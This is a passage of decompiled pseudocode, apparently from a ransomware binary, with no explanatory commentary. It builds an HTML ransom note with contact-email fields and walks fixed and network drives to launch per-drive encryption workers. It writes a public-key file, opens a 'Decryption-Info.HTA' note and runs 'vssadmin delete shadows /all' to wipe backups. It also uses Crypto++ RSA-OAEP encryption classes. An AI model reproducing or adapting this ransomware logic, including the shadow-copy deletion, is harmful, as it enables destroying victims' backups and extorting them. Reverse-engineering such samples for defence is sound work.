  v33 = v181;
  if ( v183 >= 8 )
    v33 = (void **)v181[0];
  sub_419370((int)v145, v33, v32);
  LOBYTE(v201) = 22;
  v34 = sub_419370((int)v145, L"<br/>Our Email : ", 0x11u);
  v151.QuadPart = 0i64;
  v150 = *(_OWORD *)v34;
  v151 = *((ULARGE_INTEGER *)v34 + 2);
  v34[4] = 0;
  v34[5] = (void *)7;
  *(_WORD *)v34 = 0;
  v35 = v31 | 0x10;
  v152 = v35;
  LOBYTE(v201) = 23;
  v36 = v184;
  if ( v186 >= 8 )
    v36 = (void **)v184[0];
  v37 = sub_419370((int)&v150, v36, v185);
  v149.QuadPart = 0i64;
  v148 = *(_OWORD *)v37;
  v149 = *((ULARGE_INTEGER *)v37 + 2);
  v37[4] = 0;
  v37[5] = (void *)7;
  *(_WORD *)v37 = 0;
  v38 = v35 | 0x20;
  v152 = v38;
  LOBYTE(v201) = 24;
  v39 = sub_419370((int)&v148, L"   <br/>In Case Of No Answer : ", 0x1Fu);
  v141 = 0i64;
  v140 = *(_OWORD *)v39;
  v141 = *((_QWORD *)v39 + 2);
  v39[4] = 0;
  v39[5] = (void *)7;
  *(_WORD *)v39 = 0;
  v40 = v38 | 0x40;
  v152 = v40;
  LOBYTE(v201) = 25;
  v41 = v167;
  if ( v169 >= 8 )
    v41 = (void **)v167[0];
  v42 = sub_419370((int)&v140, v41, v168);
  v139 = 0i64;
  v138 = *(_OWORD *)v42;
  v139 = *((_QWORD *)v42 + 2);
  v42[4] = 0;
  v42[5] = (void *)7;
  *(_WORD *)v42 = 0;
  v43 = v40 | 0x80;
  v152 = v43;
  sub_4228F0((int)v155, (int)&v138, L" </div></body></html>");
  v44 = v43 & 0xFFFFFF7F;
  v152 = v44;
  LOBYTE(v201) = 27;
  if ( HIDWORD(v139) >= 8 )
  {
    v45 = 2 * HIDWORD(v139) + 2;
    v46 = (void *)v138;
    if ( v45 >= 0x1000 )
    {
      v45 = 2 * HIDWORD(v139) + 37;
      v46 = *(void **)(v138 - 4);
      if ( (unsigned int)(v138 - (_DWORD)v46 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v45;
    sub_46C87D(v46);
  }
  v139 = 0x700000000i64;
  LOWORD(v138) = 0;
  v47 = v44 & 0xFFFFFFBF;
  v152 = v47;
  LOBYTE(v201) = 28;
  if ( HIDWORD(v141) >= 8 )
  {
    v48 = 2 * HIDWORD(v141) + 2;
    v49 = (void *)v140;
    if ( v48 >= 0x1000 )
    {
      v48 = 2 * HIDWORD(v141) + 37;
      v49 = *(void **)(v140 - 4);
      if ( (unsigned int)(v140 - (_DWORD)v49 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v48;
    sub_46C87D(v49);
  }
  v141 = 0x700000000i64;
  LOWORD(v140) = 0;
  v50 = v47 & 0xFFFFFFDF;
  v152 = v50;
  LOBYTE(v201) = 29;
  if ( v149.HighPart >= 8 )
  {
    v51 = 2 * v149.HighPart + 2;
    v52 = (void *)v148;
    if ( v51 >= 0x1000 )
    {
      v51 = 2 * v149.HighPart + 37;
      v52 = *(void **)(v148 - 4);
      if ( (unsigned int)(v148 - (_DWORD)v52 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v51;
    sub_46C87D(v52);
  }
  v149.QuadPart = 0x700000000i64;
  LOWORD(v148) = 0;
  v53 = v50 & 0xFFFFFFEF;
  v152 = v53;
  LOBYTE(v201) = 30;
  if ( v151.HighPart >= 8 )
  {
    v54 = 2 * v151.HighPart + 2;
    v55 = (void *)v150;
    if ( v54 >= 0x1000 )
    {
      v54 = 2 * v151.HighPart + 37;
      v55 = *(void **)(v150 - 4);
      if ( (unsigned int)(v150 - (_DWORD)v55 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v54;
    sub_46C87D(v55);
  }
  v151.QuadPart = 0x700000000i64;
  LOWORD(v150) = 0;
  v152 = v53 & 0xFFFFFFF7;
  LOBYTE(v201) = 31;
  if ( v147 >= 8 )
  {
    v56 = 2 * v147 + 2;
    v57 = v145[0];
    if ( v56 >= 0x1000 )
    {
      v56 = 2 * v147 + 37;
      v57 = (void *)*((_DWORD *)v145[0] - 1);
      if ( (unsigned int)(v145[0] - v57 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v56;
    sub_46C87D(v57);
  }
  v146 = 0;
  v147 = 7;
  LOWORD(v145[0]) = 0;
  for ( j = (int *)v174; ; j += 6 )
  {
    v199 = j;
    if ( (unsigned int)j >= HIDWORD(v174) )
      break;
    sub_419BE0(RootPathName, j);
    LOBYTE(v201) = 32;
    v59 = (CHAR *)RootPathName;
    if ( v198 >= 0x10 )
      v59 = (CHAR *)RootPathName[0];
    v60 = GetDriveTypeA(v59);
    if ( v197 && v60 != 5 && v60 != 6 && v60 >= 2 )
    {
      LOBYTE(v201) = 33;
      v61 = (CHAR *)RootPathName;
      if ( v198 >= 0x10 )
        v61 = (CHAR *)RootPathName[0];
      v62 = &v61[v197];
      v63 = (char *)RootPathName;
      if ( v198 >= 0x10 )
        v63 = (char *)RootPathName[0];
      sub_423570((int)v191, v63, v62, RootPathName[0]);
      LOBYTE(v201) = 34;
      v64 = sub_4235C0(&v135, (int)sub_40B670, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 35;
      sub_417050(&v194, v64);
      LOBYTE(v201) = 34;
      if ( v135._Id )
        goto LABEL_193;
      v66 = sub_4235C0(&v134, (int)sub_40C100, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 36;
      sub_417050(&v194, v66);
      LOBYTE(v201) = 34;
      if ( v134._Id )
        terminate(v67);
      v68 = sub_4235C0(&v136, (int)sub_40CBC0, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 37;
      sub_417050(&v194, v68);
      LOBYTE(v201) = 34;
      if ( v136._Id )
        terminate(v69);
      v70 = sub_4235C0(&v137, (int)sub_40D600, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 38;
      sub_417050(&v194, v70);
      LOBYTE(v201) = 34;
      if ( v137._Id )
        terminate(v71);
      v72 = sub_4235C0(&v142, (int)sub_40E040, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 39;
      sub_417050(&v194, v72);
      LOBYTE(v201) = 34;
      if ( v142._Id )
        terminate(v73);
      v74 = sub_4235C0(&v143, (int)sub_40E9E0, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 40;
      sub_417050(&v194, v74);
      LOBYTE(v201) = 34;
      if ( v143._Id )
        terminate(v75);
      v76 = sub_4235C0(&v144, (int)sub_40F410, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 41;
      sub_417050(&v194, v76);
      LOBYTE(v201) = 34;
      if ( v144._Id )
        terminate(v77);
      LOBYTE(v201) = 33;
      if ( v193 >= 8 )
      {
        v78 = 2 * v193 + 2;
        v159 = v78;
        v79 = (void *)v191[0];
        if ( v78 >= 0x1000 )
        {
          v78 = 2 * v193 + 37;
          v159 = v78;
          v79 = *(void **)(v191[0] - 4);
          if ( (unsigned int)(v191[0] - (_DWORD)v79 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v133 = __PAIR64__(v78, (unsigned int)v79);
        sub_46C87D(v79);
      }
      v192 = 0;
      v193 = 7;
      LOWORD(v191[0]) = 0;
      v201 = 32;
    }
    LOBYTE(v201) = 31;
    if ( v198 >= 0x10 )
    {
      v80 = v198 + 1;
      v81 = (CHAR *)RootPathName[0];
      if ( v198 + 1 >= 0x1000 )
      {
        v80 = v198 + 36;
        v81 = *(CHAR **)(RootPathName[0] - 4);
        if ( (unsigned int)(RootPathName[0] - (_DWORD)v81 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      HIDWORD(v133) = v80;
      sub_46C87D(v81);
    }
    v197 = 0;
    v198 = 15;
    LOBYTE(RootPathName[0]) = 0;
  }
  LOBYTE(v201) = 43;
  sub_4237E0(v194, SHIDWORD(v194), (void (__thiscall *)(int))sub_405020);
  v201 = 31;
  for ( k = (int *)v174; ; k += 6 )
  {
    v199 = k;
    if ( (unsigned int)k >= HIDWORD(v174) )
      break;
    sub_419BE0(RootPathName, k);
    LOBYTE(v201) = 45;
    v83 = (CHAR *)RootPathName;
    if ( v198 >= 0x10 )
      v83 = (CHAR *)RootPathName[0];
    v84 = GetDriveTypeA(v83);
    if ( v197 && v84 != 5 && v84 != 6 && v84 >= 2 )
    {
      LOBYTE(v201) = 46;
      v85 = (CHAR *)RootPathName;
      if ( v198 >= 0x10 )
        v85 = (CHAR *)RootPathName[0];
      v86 = &v85[v197];
      v87 = (char *)RootPathName;
      if ( v198 >= 0x10 )
        v87 = (char *)RootPathName[0];
      sub_423570((int)v191, v87, v86, RootPathName[0]);
      LOBYTE(v201) = 47;
      v89 = sub_423820(&v144, v88, v191, v181, v184, v167, v155);
      LOBYTE(v201) = 48;
      sub_417050(&v187, v89);
      LOBYTE(v201) = 47;
      if ( v144._Id )
        terminate(v90);
      v91 = sub_4235C0(&v143, (int)sub_410A50, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 49;
      sub_417050(&v187, v91);
      LOBYTE(v201) = 47;
      if ( v143._Id )
        terminate(v92);
      v93 = sub_4235C0(&v142, (int)sub_4114D0, v191, (_DWORD *)v189, v181, (int)v200, v184, v176);
      LOBYTE(v201) = 50;
      sub_417050(&v187, v93);
      LOBYTE(v201) = 47;
      if ( v142._Id )
        terminate(v94);
      LOBYTE(v201) = 46;
      if ( v193 >= 8 )
      {
        v95 = 2 * v193 + 2;
        v158 = v95;
        v96 = (void *)v191[0];
        if ( v95 >= 0x1000 )
        {
          v95 = 2 * v193 + 37;
          v158 = v95;
          v96 = *(void **)(v191[0] - 4);
          if ( (unsigned int)(v191[0] - (_DWORD)v96 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v133 = __PAIR64__(v95, (unsigned int)v96);
        sub_46C87D(v96);
      }
      v192 = 0;
      v193 = 7;
      LOWORD(v191[0]) = 0;
      v201 = 45;
    }
    LOBYTE(v201) = 31;
    if ( v198 >= 0x10 )
    {
      v97 = v198 + 1;
      v98 = (CHAR *)RootPathName[0];
      if ( v198 + 1 >= 0x1000 )
      {
        v97 = v198 + 36;
        v98 = *(CHAR **)(RootPathName[0] - 4);
        if ( (unsigned int)(RootPathName[0] - (_DWORD)v98 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      HIDWORD(v133) = v97;
      sub_46C87D(v98);
    }
    v197 = 0;
    v198 = 15;
    LOBYTE(RootPathName[0]) = 0;
  }
  LOBYTE(v201) = 52;
  sub_4237E0(v187, SHIDWORD(v187), (void (__thiscall *)(int))sub_405020);
  v201 = 54;
  v153 = (char *)&v130;
  sub_419BE0(&v130, v171);
  LOBYTE(v201) = 55;
  v199 = (int *)&v124;
  sub_419BE0(&v124, (_DWORD *)(v189 + 24));
  LOBYTE(v201) = 54;
  sub_414D70(v124, v125, v126, v127, (int)v128, v129, v130, v131, v132, SHIDWORD(v132), v133, HIDWORD(v133));
  memset(v154, 0, sizeof(v154));
  sub_41B2C0(v154, "C:\\ProgramData\\pubkey.txt", SHIDWORD(v132), v133, SHIDWORD(v133));
  LOBYTE(v201) = 57;
  sub_422D50(v154, "fuck");
  sub_41B090(v154);
  sub_4233D0(&v150, v133, SHIDWORD(v133));
  LOBYTE(v201) = 58;
  sub_404C10((int)&v150);
  LOBYTE(v201) = 57;
  if ( v151.HighPart >= 8 )
  {
    v99 = 2 * v151.HighPart + 2;
    v157 = v99;
    v100 = (void *)v150;
    if ( v99 >= 0x1000 )
    {
      v99 = 2 * v151.HighPart + 37;
      v157 = v99;
      v100 = *(void **)(v150 - 4);
      if ( (unsigned int)(v150 - (_DWORD)v100 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v133 = __PAIR64__(v99, (unsigned int)v100);
    sub_46C87D(v100);
  }
  v151.QuadPart = 0x700000000i64;
  LOWORD(v150) = 0;
  sub_423340(&v148, v133, SHIDWORD(v133));
  LOBYTE(v201) = 60;
  sub_404C10((int)&v148);
  LOBYTE(v201) = 57;
  sub_4193E0(&v148);
  sub_48F108("C:\\Program Files\\Decryption-Info.HTA");
  v153 = (char *)&v130;
  sub_419BE0(&v130, v171);
  LOBYTE(v201) = 62;
  v199 = (int *)&v124;
  sub_419BE0(&v124, (_DWORD *)(v189 + 24));
  LOBYTE(v201) = 57;
  sub_414D70(v124, v125, v126, v127, (int)v128, v129, v130, v131, v132, SHIDWORD(v132), v133, HIDWORD(v133));
  sub_48F108("C:\\Program Files\\Decryption-Info.HTA");
  sub_48F108("vssadmin delete shadows /all");
  LOBYTE(v201) = 54;
  sub_40A280((char *)v154);
  v201 = 20;
  if ( v156 >= 8 )
  {
    v101 = 2 * v156 + 2;
    v102 = (void *)v155[0];
    if ( v101 >= 0x1000 )
    {
      v101 = 2 * v156 + 37;
      v102 = *(void **)(v155[0] - 4);
      if ( (unsigned int)(v155[0] - (_DWORD)v102 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v101;
    sub_46C87D(v102);
  }
  v155[4] = 0;
  v156 = 7;
  LOWORD(v155[0]) = 0;
  LOBYTE(v201) = 19;
  if ( v178 >= 8 )
  {
    v103 = 2 * v178 + 2;
    v104 = v176[0];
    if ( v103 >= 0x1000 )
    {
      v103 = 2 * v178 + 37;
      v104 = (void *)*((_DWORD *)v176[0] - 1);
      if ( (unsigned int)(v176[0] - v104 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v103;
    sub_46C87D(v104);
  }
  v177 = 0;
  v178 = 7;
  LOWORD(v176[0]) = 0;
  LOBYTE(v201) = 18;
  if ( v183 >= 8 )
  {
    v105 = 2 * v183 + 2;
    v106 = v181[0];
    if ( v105 >= 0x1000 )
    {
      v105 = 2 * v183 + 37;
      v106 = (void *)*((_DWORD *)v181[0] - 1);
      if ( (unsigned int)(v181[0] - v106 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v105;
    sub_46C87D(v106);
  }
  v182 = 0;
  v183 = 7;
  LOWORD(v181[0]) = 0;
  LOBYTE(v201) = 17;
  if ( v186 >= 8 )
  {
    v107 = 2 * v186 + 2;
    v108 = v184[0];
    if ( v107 >= 0x1000 )
    {
      v107 = 2 * v186 + 37;
      v108 = (void *)*((_DWORD *)v184[0] - 1);
      if ( (unsigned int)(v184[0] - v108 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v107;
    sub_46C87D(v108);
  }
  v185 = 0;
  v186 = 7;
  LOWORD(v184[0]) = 0;
  LOBYTE(v201) = 16;
  v65 = (_DWORD *)v187;
  if ( (_DWORD)v187 )
  {
    v109 = v187;
    if ( (_DWORD)v187 != HIDWORD(v187) )
    {
      while ( !*(_DWORD *)(v109 + 4) )
      {
        LODWORD(v109) = v109 + 8;
        if ( (_DWORD)v109 == HIDWORD(v187) )
          goto LABEL_151;
      }
LABEL_193:
      terminate(v65);
    }
LABEL_151:
    v110 = 8 * ((v188 - (int)v187) >> 3);
    if ( v110 >= 0x1000 )
    {
      v110 += 35;
      v65 = *(_DWORD **)(v187 - 4);
      if ( (unsigned int)(v187 - (_DWORD)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v110;
    sub_46C87D(v65);
    v187 = 0i64;
    v188 = 0;
  }
  LOBYTE(v201) = 15;
  v65 = (_DWORD *)v179;
  if ( (_DWORD)v179 )
  {
    if ( (_DWORD)v179 != HIDWORD(v179) )
    {
      while ( !v65[1] )
      {
        v65 += 2;
        if ( v65 == (_DWORD *)HIDWORD(v179) )
          goto LABEL_158;
      }
      goto LABEL_193;
    }
LABEL_158:
    v111 = (void *)v179;
    v112 = 8 * ((v180 - (int)v179) >> 3);
    if ( v112 >= 0x1000 )
    {
      v112 += 35;
      v111 = *(void **)(v179 - 4);
      if ( (unsigned int)(v179 - (_DWORD)v111 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v112;
    sub_46C87D(v111);
    v179 = 0i64;
    v180 = 0;
  }
  LOBYTE(v201) = 14;
  v65 = (_DWORD *)v194;
  if ( (_DWORD)v194 )
  {
    v113 = v194;
    if ( (_DWORD)v194 != HIDWORD(v194) )
    {
      while ( !*(_DWORD *)(v113 + 4) )
      {
        LODWORD(v113) = v113 + 8;
        if ( (_DWORD)v113 == HIDWORD(v194) )
          goto LABEL_165;
      }
      goto LABEL_193;
    }
LABEL_165:
    v114 = 8 * ((v195 - (int)v194) >> 3);
    if ( v114 >= 0x1000 )
    {
      v114 += 35;
      v65 = *(_DWORD **)(v194 - 4);
      if ( (unsigned int)(v194 - (_DWORD)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v114;
    sub_46C87D(v65);
    v194 = 0i64;
    v195 = 0;
  }
  LOBYTE(v201) = 13;
  if ( v163 >= 0x10 )
  {
    v115 = v163 + 1;
    v116 = (void *)v162[0];
    if ( v163 + 1 >= 0x1000 )
    {
      v115 = v163 + 36;
      v116 = *(void **)(v162[0] - 4);
      if ( (unsigned int)(v162[0] - (_DWORD)v116 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v115;
    sub_46C87D(v116);
  }
  v162[4] = 0;
  v163 = 15;
  LOBYTE(v162[0]) = 0;
  LOBYTE(v201) = 5;
  sub_41D6B0((int *)&v189);
  LOBYTE(v201) = 2;
  sub_41D6B0((int *)&v174);
  LOBYTE(v201) = 1;
  if ( v166 >= 0x10 )
  {
    v117 = v166 + 1;
    v118 = v164[0];
    if ( v166 + 1 >= 0x1000 )
    {
      v117 = v166 + 36;
      v118 = (void *)*((_DWORD *)v164[0] - 1);
      if ( (unsigned int)(v164[0] - v118 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v117;
    sub_46C87D(v118);
  }
  v165 = 0;
  v166 = 15;
  LOBYTE(v164[0]) = 0;
  LOBYTE(v201) = 0;
  if ( v169 >= 8 )
  {
    v119 = 2 * v169 + 2;
    v120 = v167[0];
    if ( v119 >= 0x1000 )
    {
      v119 = 2 * v169 + 37;
      v120 = (void *)*((_DWORD *)v167[0] - 1);
      if ( (unsigned int)(v167[0] - v120 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v119;
    sub_46C87D(v120);
  }
  v168 = 0;
  v169 = 7;
  LOWORD(v167[0]) = 0;
  v201 = -1;
  if ( v173 >= 0x10 )
  {
    v121 = v173 + 1;
    v122 = v171[0];
    if ( v173 + 1 >= 0x1000 )
    {
      v121 = v173 + 36;
      v122 = (void *)*((_DWORD *)v171[0] - 1);
      if ( (unsigned int)(v171[0] - v122 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    HIDWORD(v133) = v121;
    sub_46C87D(v122);
  }
  v172 = 0;
  v173 = 15;
  LOBYTE(v171[0]) = 0;
  return 0;
}
// 416612: variable 'v88' is possibly undefined
// 416F98: variable 'v65' is possibly undefined
// 416F9D: variable 'v67' is possibly undefined
// 416FA2: variable 'v69' is possibly undefined
// 416FA7: variable 'v71' is possibly undefined
// 416FAC: variable 'v73' is possibly undefined
// 416FB1: variable 'v75' is possibly undefined
// 416FB6: variable 'v77' is possibly undefined
// 416FC5: variable 'v90' is possibly undefined
// 416FCA: variable 'v92' is possibly undefined
// 416FCF: variable 'v94' is possibly undefined
// 417040: using guessed type void __noreturn sub_417040();
// 469998: using guessed type _DWORD __stdcall __std_fs_space(LPCWSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes);
// 48CEA4: using guessed type _DWORD __cdecl set_terminate(_DWORD);
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);
// 4CD678: using guessed type wchar_t aSteven77xxMail[54];
// 4CD85C: using guessed type wchar_t aDivBodyHtml[22];
// 4CD888: using guessed type wchar_t aBrInCaseOfNoAn[32];
// 4CD8C8: using guessed type wchar_t aBrOurEmail[18];
// 4CD8F0: using guessed type wchar_t aHtmlHeadMetaHt[2967];
// 4F1510: using guessed type __int64 qword_4F1510;
// 415630: using guessed type int RootPathName[4];

//----- (00417020) --------------------------------------------------------
void __noreturn sub_417020()
{
  sub_422D50(byte_4F0290, "Unhandled exception\n");
  abort();
}
// 417020: using guessed type void __noreturn sub_417020();

//----- (00417050) --------------------------------------------------------
int __thiscall sub_417050(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int result; // eax

  v2 = (_DWORD *)this[1];
  if ( (_DWORD *)this[2] == v2 )
    return sub_423A30(this, v2, a2);
  *v2 = *a2;
  result = a2[1];
  v2[1] = result;
  *a2 = 0;
  a2[1] = 0;
  this[1] += 8;
  return result;
}

//----- (00417090) --------------------------------------------------------
void __thiscall sub_417090(_DWORD *this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // ecx

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    v3 = (_DWORD *)this[1];
    if ( v2 != v3 )
    {
      do
      {
        if ( v2[1] )
          terminate(v3);
        v2 += 2;
      }
      while ( v2 != v3 );
      v2 = (_DWORD *)*this;
    }
    if ( ((this[2] - (_DWORD)v2) & 0xFFFFFFF8) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}
// 48CEC4: using guessed type void __thiscall __noreturn terminate(_DWORD);

//----- (00417130) --------------------------------------------------------
_DWORD *__thiscall sub_417130(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edx
  _DWORD *v3; // edi
  int i; // esi

  v2 = a2;
  this[1249] = -1;
  v3 = this + 2;
  this[1] = a2;
  for ( i = 1; i < 624; ++i )
  {
    ++v3;
    v2 = i + 1812433253 * (v2 ^ (v2 >> 30));
    *(v3 - 1) = v2;
  }
  *this = 624;
  return this;
}

//----- (00417180) --------------------------------------------------------
void __thiscall sub_417180(void **this)
{
  void *v2; // esi

  v2 = *this;
  sub_4216A0(*((_DWORD **)*this + 1));
  *((_DWORD *)*this + 1) = v2;
  *(_DWORD *)*this = v2;
  *((_DWORD *)*this + 2) = v2;
  this[1] = 0;
  sub_46C87D(*this);
}

//----- (00417200) --------------------------------------------------------
void __thiscall sub_417200(_DWORD *this)
{
  _DWORD *v2; // eax

  v2 = (_DWORD *)*this;
  if ( *this )
  {
    if ( (unsigned int)(this[2] - (_DWORD)v2) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (00417280) --------------------------------------------------------
void __thiscall sub_417280(int *this)
{
  sub_41D6B0(this);
}

//----- (004172C0) --------------------------------------------------------
int *__thiscall sub_4172C0(int *this, int a2, int a3)
{
  int v4; // ecx
  _DWORD v6[6]; // [esp+0h] [ebp-24h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v6[5] = v6;
  v6[4] = this;
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( sub_41D730((unsigned int *)this, 0x14u) )
  {
    v7 = 0;
    this[1] = sub_41D7F0(*this, v4);
    v7 = -1;
  }
  return this;
}
// 41731B: variable 'v4' is possibly undefined

//----- (00417360) --------------------------------------------------------
void __thiscall sub_417360(int *this)
{
  int v2; // ecx
  _DWORD *v3; // edi

  v2 = *this;
  if ( v2 )
  {
    sub_425130(v2, this[1]);
    v3 = (_DWORD *)*this;
    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
    *this = 0;
    this[1] = 0;
    this[2] = 0;
  }
}

//----- (00417410) --------------------------------------------------------
int __stdcall sub_417410(int a1)
{
  sub_41E390(a1);
  return a1;
}

//----- (00417470) --------------------------------------------------------
int __thiscall sub_417470(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 2) + 32))(this - 2);
}

//----- (00417480) --------------------------------------------------------
int sub_417480()
{
  return sub_423EF0();
}

//----- (00417490) --------------------------------------------------------
int __thiscall sub_417490(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 32))(this - 1) + 8;
}

//----- (004174A0) --------------------------------------------------------
int __thiscall sub_4174A0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 36))(this - 1) + 8;
}

//----- (004174B0) --------------------------------------------------------
char *__thiscall sub_4174B0(char *this)
{
  return this + 12;
}

//----- (004174C0) --------------------------------------------------------
int __thiscall sub_4174C0(_DWORD *this)
{
  _DWORD *v1; // esi
  int result; // eax

  v1 = this + 3;
  result = sub_40A6C0(this + 3);
  v1[15] = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00417520) --------------------------------------------------------
_DWORD *__thiscall sub_417520(int this)
{
  _DWORD *v2; // esi
  void *v3; // eax
  void *v4; // edx
  void *v5; // eax
  void *v6; // ecx
  _DWORD *result; // eax

  v2 = operator new(0x30u);
  memset(v2, 0, 0x30u);
  *((_BYTE *)v2 + 8) = *(_BYTE *)(this + 4);
  v2[3] = *(_DWORD *)(this + 8);
  v2[5] = *(_DWORD *)(this + 16);
  v2[6] = *(_DWORD *)(this + 20);
  v3 = (void *)sub_41E7A0(*(_DWORD *)(this + 20), 0);
  v2[7] = v3;
  v4 = *(void **)(this + 24);
  if ( v4 )
    sub_401670(v3, 4 * v2[6], v4, 4 * *(_DWORD *)(this + 20));
  v2[9] = *(_DWORD *)(this + 32);
  v2[10] = *(_DWORD *)(this + 36);
  v5 = *(void **)(this + 36);
  if ( v5 )
    v5 = sub_45AEA0(*(_DWORD *)(this + 36));
  v2[11] = v5;
  v6 = *(void **)(this + 40);
  if ( v6 )
    sub_401670(v5, v2[10], v6, *(_DWORD *)(this + 36));
  result = v2 + 1;
  *v2 = &off_4BAC30;
  v2[1] = &off_4BAC70;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BAC30: using guessed type int (__stdcall *off_4BAC30)(int);
// 4BAC70: using guessed type void *off_4BAC70;

//----- (00417620) --------------------------------------------------------
char *__thiscall sub_417620(char *this)
{
  return this + 144;
}

//----- (00417630) --------------------------------------------------------
_DWORD *__thiscall sub_417630(_DWORD *this, int a2)
{
  int v3; // ecx

  sub_435E90(this + 1, 1);
  sub_40A110(this + 3, 1);
  *this = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  this[1] = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  this[2] = &CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
  v3 = (int)this + *(_DWORD *)(this[5] + 4) + 20;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 8))(v3, a2);
  return this;
}
// 4BB388: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
// 4BB3B4: using guessed type void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable';
